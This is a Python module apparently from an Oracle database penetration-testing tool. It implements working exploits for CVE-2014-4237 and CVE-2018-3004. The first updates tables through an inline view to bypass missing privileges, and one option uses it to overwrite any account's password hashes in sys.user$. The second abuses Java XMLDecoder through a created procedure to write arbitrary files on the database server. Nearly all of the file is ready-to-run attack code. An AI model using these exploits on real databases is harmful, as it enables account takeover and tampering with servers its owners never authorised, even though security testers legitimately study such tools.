import logging
from OracleDatabase import OracleDatabase
from Constants import *
from Utils import checkOptionsGivenByTheUser
from passlib.hash import oracle11 as oracle11
from passlib.hash import oracle10 as oracle10


class CVE_XXXX_YYYY (OracleDatabase):
	'''
	CVE-2014-4237 ? : A user authenticated can modify all tables who can select even if he can't modify them normally (no ALTER privilege)
	'''


	def __init__(self, args):
		'''
		Constructor
		'''
		logging.debug("CVE_XXXX_YYYY object created")
		OracleDatabase.__init__(self,args)
		self.args=args
		
	####################################################################################################################
	#											CVE_2014_4237
	#
	# A user authenticated can modify all tables who can select even if he can't modify them 
	# normally (no ALTER privilege on them)
	# https://twitter.com/gokhanatil/status/595853921479991297
	####################################################################################################################
	def exploit_CVE_2014_4237 (self, updateRequestNormal, updateRequestWithView):
		'''
		Returns:
		- True: current user can exploit this CVE
		- False: current user can not exploit this CVE"
		- None: impossible to known if vulnerable
		'''
		logging.info("Try to exploit the CVE-2014-4237 for doing this operation: {0}".format(updateRequestNormal))
		status = self.__execPLSQL__(updateRequestNormal)
		if isinstance(status, Exception):
			logging.info("The current user can NOT modify the table with a simple update request. It is a good news for testing if vulnerable!")
			logging.info('Testing if CVE-2014-4237 can be exploited by current user using the following SQL request: {0}'.format(updateRequestWithView))
			status = self.__execPLSQL__(updateRequestWithView)
			if isinstance(status, Exception):
				logging.info("Impossible to modify the table (not vulnerable to CVE-2014-4237): {0}".format(self.cleanError(status)))
				return False
			else : 
				logging.info("The current user can alter the table. Vulnerable to CVE-2014-4237.")
				return True
		else :
			logging.info("The current user can modify the table with a simple update request. Bad news for testing if vulnerable!")
			return None
			
	####################################################################################################################
	#											CVE_2018_3004
	#
	# Vulnerability in the Java VM component of Oracle Database Server. 
	# Supported versions that are affected are 11.2.0.4, 12.1.0.2,12.2.0.1 and 18.2. 
	# Difficult to exploit vulnerability allows low privileged attacker having Create Session, 
	# Create Procedure privilege with network access via multiple protocols to compromise Java VM. 
	# Successful attacks of this vulnerability can result in unauthorized access to critical data or 
	# complete access to all Java VM accessible data.
	# Privilege required : Create Session, Create Procedure
	# grant create session to user2;
	# http://obtruse.syfrtext.com/2018/07/oracle-privilege-escalation-via.html
	####################################################################################################################
	def exploit_CVE_2018_3004 (self, path, dataInFile):
		'''
		Returns:
		- True: current user can exploit this CVE
		- False: current user can not exploit this CVE
		- None: impossible to known if vulnerable
		'''
		DROP_REQ1 = "DROP JAVA SOURCE ExploitDecode"
		DROP_REQ2 = "DROP PROCEDURE exploitdecode"
		REQUEST_1 ="""CREATE OR REPLACE AND COMPILE JAVA SOURCE named ExploitDecode as
            import java.io.*;
            import java.beans.*;
            public class ExploitDecode{
                public static void input(String xml) throws InterruptedException, IOException {
                  XMLDecoder decoder = new XMLDecoder ( new ByteArrayInputStream(xml.getBytes()));
                  Object object = decoder.readObject();
                  System.out.println(object.toString());
                  decoder.close();      
                }
            };"""
		REQUEST_2 = """CREATE OR REPLACE PROCEDURE exploitdecode (p_xml IN VARCHAR2) IS
                       language java name 'ExploitDecode.input(java.lang.String)';
		"""
		REQUEST_EXPLOIT_CREATE_FILE = """BEGIN
                exploitdecode('
                <java class="java.beans.XMLDecoder" version="1.4.0" >
                   <object class="java.io.FileWriter">
                      <string>{0}</string>
                      <boolean>True</boolean>
                      <void method="write">
                         <string>{1}</string>
                      </void>
                      <void method="close" />
                   </object>
                </java>');
                END;
		"""#{0} path, {1}  data in file
		logging.info("Try to exploit the CVE-2018-3004 for creating a file on {0} with this data {1}".format(path, dataInFile))
		status = self.__execPLSQL__(REQUEST_1)
		if isinstance(status,Exception):
			logging.info("Impossible to create function to call java (step 1/3): {0}".format(self.cleanError(status)))
			return False
		logging.debug("First request executed successfully")
		status = self.__execPLSQL__(REQUEST_2)
		if isinstance(status,Exception):
			logging.info("Impossible to create procedure to call java (step 2/3): {0}".format(self.cleanError(status)))
			return False
		logging.debug("Second request executed successfully")
		status = self.__execPLSQL__(REQUEST_EXPLOIT_CREATE_FILE.format(path, dataInFile))
		if isinstance(status,Exception):
			logging.info("Impossible to execute procedure to create file (step 3/3): {0}".format(self.cleanError(status)))
			return False
		logging.debug("Exploit executed successfully")
		status = self.__execPLSQL__(DROP_REQ2)
		status = self.__execPLSQL__(DROP_REQ1)
		return True
		
	####################################################################################################################
	#											ALL FUNCTION
	####################################################################################################################
		
	def testAll (self):
		'''
		Test all CVE
		'''
		###### CVE_2014_4237 ######
		REQ_ALTER_AUDIT_ACTIONS_WITH_VIEW_FOR_CVE_2014_4237 = "update (with tmp as (select * from sys.AUDIT_ACTIONS) select * from tmp) set name='UNKNOWN' where action=0"
		REQ_ALTER_AUDIT_ACTIONS_FOR_CVE_2014_4237 = "update sys.AUDIT_ACTIONS set name='UNKNOWN' where action=0"
		self.args['print'].subtitle("Modify any table while/when he can select it only normally (CVE-2014-4237)?")
		status = self.exploit_CVE_2014_4237(updateRequestNormal=REQ_ALTER_AUDIT_ACTIONS_FOR_CVE_2014_4237, updateRequestWithView=REQ_ALTER_AUDIT_ACTIONS_WITH_VIEW_FOR_CVE_2014_4237)
		if status == True:
			logging.info("The current user can modify the table sys.AUDIT_ACTIONS for example while he can't modify it normally (no alter privilege)")
			self.args['print'].goodNews("OK")
		elif status == False:
			logging.info("The current user can't exploit this CVE")
			self.args['print'].badNews("KO")
		else:
			logging.info("Impossible to know if this database is vulnerable to this CVE because current user is too privileged")
			self.args['print'].unknownNews("Impossible to know")
		###### CVE-2018-3004 ######
		self.args['print'].subtitle("Create file on target (CVE-2018-3004)?")
		if self.remoteSystemIsWindows() == True:
			logging.info("The remote server is Windows")
			testPath, dataInFile = "testDJZDZLK.txt", "data"
		else:
			logging.info("The remote server is Linux")
			testPath, dataInFile = "/tmp/testDJZDZLK.txt", "data"
		logging.debug("Test path used: {0}".format(testPath))
		status = self.exploit_CVE_2018_3004(testPath, dataInFile)
		if status == True:
			logging.info("The current user can create a file on the target with CVE-2018-3004")
			self.args['print'].goodNews("OK")
		elif status == False:
			logging.info("The current user can not create a file on the target with CVE-2018-3004")
			self.args['print'].badNews("KO")
		else:
			logging.info("Impossible to know if this database is vulnerable to this CVE-2018-3004")
			self.args['print'].unknownNews("Impossible to know")
		
def runCVEXXXYYYModule(args):
	'''
	Run the CVE_XXXX_YYYY module
	'''
	if checkOptionsGivenByTheUser(args,["test-module","set-pwd-2014-4237","cve-2018-3004"],checkAccount=False) == False : return EXIT_MISS_ARGUMENT
	cve = CVE_XXXX_YYYY(args)
	status = cve.connection(stopIfError=True)
	if args['test-module'] == True :
		cve.testAll()
	if args['set-pwd-2014-4237'] != None :
		hash11g = oracle11.encrypt(args['set-pwd-2014-4237'][1])
		hash10g = oracle10.encrypt(args['set-pwd-2014-4237'][1], user=args['set-pwd-2014-4237'][0])
		logging.info("hash11g('{2}')={0} & hash10g('{2}')={1}".format(hash11g, hash10g, args['set-pwd-2014-4237'][0]))
		REQ_ALTER_AUDIT_ACTIONS_WITH_VIEW_FOR_CVE_2014_4237 = "update (with tmp as (select * from sys.user$) select * from tmp) set password='{1}', SPARE4='{2}' where name='{0}'".format(args['set-pwd-2014-4237'][0], hash10g, hash11g)
		REQ_ALTER_AUDIT_ACTIONS_FOR_CVE_2014_4237 = "update sys.user$ set password='{1}', SPARE4='{2}' where name='{0}'".format(args['set-pwd-2014-4237'][0], hash10g, hash11g)
		args['print'].title("Modify password of '{0}' by these hashs '{1}' & '{2}' using CVE-2014-4237".format(args['set-pwd-2014-4237'][0],hash10g, hash11g))
		status = cve.exploit_CVE_2014_4237(updateRequestNormal=REQ_ALTER_AUDIT_ACTIONS_FOR_CVE_2014_4237, updateRequestWithView=REQ_ALTER_AUDIT_ACTIONS_WITH_VIEW_FOR_CVE_2014_4237)
		if status == True:
			cve.args['print'].goodNews("The password of '{0}' has been replaced by '{1}' by exploiting CVE-2014-4237. DB restart necessary!".format(args['set-pwd-2014-4237'][0],args['set-pwd-2014-4237'][1]))
		elif status == False:
			cve.args['print'].badNews("The password of '{0}' has NOT been replaced".format(args['set-pwd-2014-4237'][0]))
		elif status == None:
			cve.args['print'].goodNews("The password of '{0}' has been replaced. This CVE has not be used to do that (if it impacts this database). DB restart necessary!".format(args['set-pwd-2014-4237'][0]))
	if args['cve-2018-3004'] != None :
		args['print'].title("Create file {0} with {1} remotely using CVE-2018-3004".format(repr(args['cve-2018-3004'][0]), repr(args['cve-2018-3004'][1])))
		status = cve.exploit_CVE_2018_3004(args['cve-2018-3004'][0], args['cve-2018-3004'][1])
		if status == True:
			cve.args['print'].goodNews("The file {0} has been created on the target".format(args['cve-2018-3004'][0]))
		elif status == False:
			cve.args['print'].badNews("The file {0} has NOT been created on the target".format(args['cve-2018-3004'][0]))
		elif status == None:
			cve.args['print'].goodNews("Impossible to know if this database is vulnerable to this CVE-2018-3004")
		
		
		
		
		
